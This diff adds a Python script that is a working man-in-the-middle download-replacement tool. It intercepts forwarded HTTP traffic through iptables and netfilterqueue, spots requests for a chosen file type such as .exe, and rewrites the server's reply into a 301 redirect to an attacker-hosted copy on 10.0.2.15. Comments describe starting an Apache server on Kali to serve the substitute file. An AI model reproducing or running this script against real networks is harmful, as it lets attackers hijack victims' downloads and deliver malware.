@@ -1,0 +1,45 @@
+#!/usr/bin/env python
+import subprocess
+import netfilterqueue
+import scapy.all as scapy
+
+ackList = []
+
+def set_load(packet,load):
+    packet[scapy.Raw].load = load
+    del packet[scapy.IP].len
+    del packet[scapy.IP].chksum
+    del packet[scapy.TCP].chksum
+    return packet
+def process_packet(packet):
+    scapy_packet = scapy.IP(packet.get_payload())
+    if scapy_packet.haslayer(scapy.Raw):
+        if scapy_packet[scapy.TCP].dport == 80:
+            if fileType in str(scapy_packet[scapy.Raw].load):
+                print("[+] " + fileType + " Request")
+                ackList.append(scapy_packet[scapy.TCP].ack)
+        elif scapy_packet[scapy.TCP].sport == 80:
+            if scapy_packet[scapy.TCP].seq in ackList:
+                ackList.remove(scapy_packet[scapy.TCP].seq)
+                print("Replacing file")
+                modifiedPacket = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://10.0.2.15/index.html\n\n")
+                packet.set_payload(bytes(modifiedPacket))
+    packet.accept()
+
+
+try:
+    queueNum = input("Please enter the queue number ")
+    # subprocess.call(['iptables', '-I', 'INPUT', '-j', 'NFQUEUE', '--queue-num', queueNum])
+    # subprocess.call(['iptables', '-I', 'OUTPUT', '-j', 'NFQUEUE', '--queue-num', queueNum])
+    subprocess.call(['iptables', '-I', 'FORWARD', '-j', 'NFQUEUE', '--queue-num', queueNum])
+    fileType = input("Please enter the file type without any spaces ... E.g :'exe'")
+    queue = netfilterqueue.NetfilterQueue()
+    queue.bind(int(queueNum), process_packet)
+    queue.run()
+except(KeyboardInterrupt):
+    print('[+] Keyboard interrupt detected ... Resetting IP Tables')
+    subprocess.call(['iptables', '--flush'])
+# iptables -I FORWARD -j NFQUEUE --queue-num 0
+# web server on kali command (service apache2 start)
+# sudo systemctl enable systemd-resolved.service
+# sudo systemd-resolve --flush-caches
